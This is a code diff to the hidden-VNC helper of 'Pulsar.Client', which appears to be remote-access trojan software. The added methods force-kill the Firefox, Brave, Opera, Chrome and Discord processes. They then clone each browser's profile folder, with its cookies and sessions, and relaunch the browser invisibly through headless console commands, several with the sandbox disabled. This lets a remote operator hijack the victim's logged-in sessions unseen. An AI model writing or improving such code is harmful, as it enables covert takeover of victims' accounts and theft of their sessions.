@@ -96,65 +96,82 @@ namespace Pulsar.Client.Helper.HVNC
         public void StartFirefox()
         {
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
-
-            if (!Directory.Exists(path))
-            {
-                return;
-            }
+            if (!Directory.Exists(path)) return;
 
             string sourceDir = Path.Combine(path, "Profiles");
-
-            if (!Directory.Exists(sourceDir))
-            {
-                return;
-            }
-
-            string text = Path.Combine(path, "SecureFolder");
-            string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
-            if (!Directory.Exists(text))
-            {
-                this.CreateProc(filePath);
-                Directory.CreateDirectory(text);
-                this.CloneDirectory(sourceDir, text);
-            }
-            else
-            {
-                DeleteFolder(text);
-                this.StartEdge();
-            }
-            string filePath2 = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile " + text;
-            this.CreateProc(filePath2);
-        }
-
-        public void StartBrave()
-        {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
-
-            if (!Directory.Exists(path))
-            {
-                return;
-            }
-
-            string sourceDir = Path.Combine(path, "User Data");
-
-            if (!Directory.Exists(sourceDir))
-            {
-                return;
-            }
+            if (!Directory.Exists(sourceDir)) return;
 
             string secureFolder = Path.Combine(path, "SecureFolder");
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
+
+            bool needsClone = false;
 
             if (!Directory.Exists(secureFolder))
             {
                 this.CreateProc(killCommand);
                 Directory.CreateDirectory(secureFolder);
-                this.CloneDirectory(sourceDir, secureFolder);
+                needsClone = true;
             }
             else
             {
                 DeleteFolder(secureFolder);
-                this.StartBrave();
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
+            }
+
+            if (needsClone)
+            {
+                try
+                {
+                    this.CloneDirectory(sourceDir, secureFolder);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("Failed to clone Firefox profile: " + ex.Message);
+                }
+            }
+
+            string startCommand = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile \"" + secureFolder + "\"";
+            this.CreateProc(startCommand);
+        }
+
+        public void StartBrave()
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
+            if (!Directory.Exists(path)) return;
+
+            string sourceDir = Path.Combine(path, "User Data");
+            if (!Directory.Exists(sourceDir)) return;
+
+            string secureFolder = Path.Combine(path, "SecureFolder");
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
+
+            bool needsClone = false;
+
+            if (!Directory.Exists(secureFolder))
+            {
+                this.CreateProc(killCommand);
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
+            }
+            else
+            {
+
+                DeleteFolder(secureFolder);
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
+            }
+
+            if (needsClone)
+            {
+                try
+                {
+                    this.CloneDirectory(sourceDir, secureFolder);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("Failed to clone Brave profile: " + ex.Message);
+                }
             }
 
             string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
@@ -163,7 +180,42 @@ namespace Pulsar.Client.Helper.HVNC
 
         public void StartOpera()
         {
-            //soon
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\";
+            if (!Directory.Exists(path)) return;
+
+            string sourceDir = path;
+            string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
+
+            bool needsClone = false;
+
+            if (!Directory.Exists(secureFolder))
+            {
+                this.CreateProc(killCommand);
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
+            }
+            else
+            {
+                DeleteFolder(secureFolder);
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
+            }
+
+            if (needsClone)
+            {
+                try
+                {
+                    this.CloneDirectory(sourceDir, secureFolder);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("Failed to clone Opera profile: " + ex.Message);
+                }
+            }
+
+            string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + secureFolder + "\"";
+            this.CreateProc(startCommand);
         }
 
         public void StartEdge()
@@ -201,38 +253,56 @@ namespace Pulsar.Client.Helper.HVNC
 
         public void Startchrome()
         {
-            try
-            {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
+            if (!Directory.Exists(path)) return;
 
-                if (!Directory.Exists(path))
-                {
-                    return;
-                }
+            string sourceDir = Path.Combine(path, "User Data");
+            if (!Directory.Exists(sourceDir)) return;
 
-                string sourceDir = Path.Combine(path, "User Data");
-                string text = Path.Combine(path, "SecureFolder");
-                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-                if (!Directory.Exists(text))
-                {
-                    Directory.CreateDirectory(text);
-                    this.CreateProc(filePath);
-                    this.CloneDirectory(sourceDir, text);
-                }
-                else
-                {
-                    DeleteFolder(text);
-                    this.Startchrome();
-                }
-                string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
-                this.CreateProc(filePath2);
-            }
-            catch (Exception ex)
+            string secureFolder = Path.Combine(path, "SecureFolder");
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
+
+            bool needsClone = false;
+
+            if (!Directory.Exists(secureFolder))
             {
-                Debug.WriteLine("Error starting Chrome: " + ex.Message);
-                return;
+                this.CreateProc(killCommand);
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
             }
-            return;
+            else
+            {
+                DeleteFolder(secureFolder);
+                Directory.CreateDirectory(secureFolder);
+                needsClone = true;
+            }
+
+            if (needsClone)
+            {
+                try
+                {
+                    this.CloneDirectory(sourceDir, secureFolder);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("Failed to clone Chrome profile: " + ex.Message);
+                }
+            }
+
+            string startCommand = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
+            this.CreateProc(startCommand);
+        }
+
+        public void StartDiscord()
+        {
+            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
+            if (!File.Exists(discordPath)) return;
+
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
+            this.CreateProc(killCommand);
+
+            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
+            this.CreateProc(startCommand);
         }
 
         public void StartExplorer()
